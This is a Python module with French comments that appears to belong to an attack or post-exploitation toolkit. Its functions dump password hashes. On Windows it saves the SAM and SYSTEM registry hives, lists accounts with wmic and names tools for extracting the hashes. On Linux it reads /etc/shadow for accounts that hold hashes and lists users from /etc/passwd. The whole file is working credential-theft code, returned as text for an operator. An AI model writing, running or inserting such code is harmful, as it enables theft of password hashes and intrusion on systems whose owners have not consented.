"""Module de récupération des hashes : SAM (Windows) ou shadow (Linux)."""

import logging
import os
import platform
import subprocess

logger = logging.getLogger(__name__)


def dump_hashes() -> str:
    """Récupère les hashes de mots de passe selon l'OS.

    Windows : Tente de lire la base SAM via reg save ou outils système.
    Linux   : Tente de lire /etc/shadow.

    Returns:
        Contenu des hashes ou message d'erreur
    """
    system = platform.system().lower()

    if system == "windows":
        return _dump_windows_hashes()
    elif system == "linux":
        return _dump_linux_hashes()
    else:
        return f"[!] OS non supporté : {system}"


def _dump_windows_hashes() -> str:
    """Tente de récupérer les hashes sous Windows.

    Utilise reg.exe pour sauvegarder la ruche SAM.
    Note : Nécessite des privilèges élevés (Administrateur).
    """
    try:
        output_parts = ["[*] Tentative de dump SAM (Windows)..."]

        # Méthode 1 : reg save (nécessite admin)
        try:
            # Sauvegarder SAM et SYSTEM
            subprocess.run(
                "reg save hklm\\sam sam.save /y",
                shell=True,
                capture_output=True,
                text=True,
                timeout=10,
            )
            subprocess.run(
                "reg save hklm\\system system.save /y",
                shell=True,
                capture_output=True,
                text=True,
                timeout=10,
            )

            if os.path.exists("sam.save") and os.path.exists("system.save"):
                output_parts.append("[+] Fichiers SAM et SYSTEM sauvegardés")
                output_parts.append("[+] Utilisez 'samdump2' ou 'secretsdump' pour extraire les hashes")
            else:
                output_parts.append("[!] Échec de la sauvegarde (privilèges insuffisants ?)")

        except subprocess.TimeoutExpired:
            output_parts.append("[!] Commande expirée")
        except Exception as e:
            output_parts.append(f"[!] Erreur reg save : {e}")

        # Méthode 2 : wmic (info utilisateur)
        try:
            result = subprocess.run(
                "wmic useraccount get name,sid",
                shell=True,
                capture_output=True,
                text=True,
                timeout=10,
            )
            if result.stdout.strip():
                output_parts.append("\n[*] Utilisateurs système :")
                output_parts.append(result.stdout.strip())
        except Exception:
            pass

        return "\n".join(output_parts)

    except Exception as e:
        logger.error(f"Erreur dump Windows : {e}")
        return f"[!] Erreur dump Windows : {e}"


def _dump_linux_hashes() -> str:
    """Tente de lire /etc/shadow sous Linux.

    Note : Nécessite des privilèges root.
    """
    try:
        shadow_path = "/etc/shadow"
        output_parts = ["[*] Tentative de lecture de /etc/shadow..."]

        if os.path.exists(shadow_path) and os.access(shadow_path, os.R_OK):
            with open(shadow_path, "r") as f:
                content = f.read()

            # Filtrer les lignes pertinentes (non vides, non commentaires)
            lines = []
            for line in content.splitlines():
                if line and not line.startswith("#"):
                    parts = line.split(":")
                    if len(parts) >= 2 and parts[1] not in ("!", "*", "!!", ""):
                        lines.append(line)

            if lines:
                output_parts.append("[+] Contenu de /etc/shadow :")
                output_parts.extend(lines)
            else:
                output_parts.append("[!] Aucun hash trouvé dans /etc/shadow")
        else:
            output_parts.append("[!] Accès refusé à /etc/shadow (root nécessaire)")

        # Afficher /etc/passwd pour les infos utilisateurs
        passwd_path = "/etc/passwd"
        if os.path.exists(passwd_path):
            output_parts.append("\n[*] Utilisateurs système (/etc/passwd) :")
            with open(passwd_path, "r") as f:
                for line in f:
                    if not line.startswith("#"):
                        parts = line.split(":")
                        uid = int(parts[2])
                        if uid >= 1000 or uid == 0:  # Utilisateurs normaux + root
                            output_parts.append(f"  {parts[0]} (UID={uid})")

        return "\n".join(output_parts)

    except Exception as e:
        logger.error(f"Erreur dump Linux : {e}")
        return f"[!] Erreur dump Linux : {e}"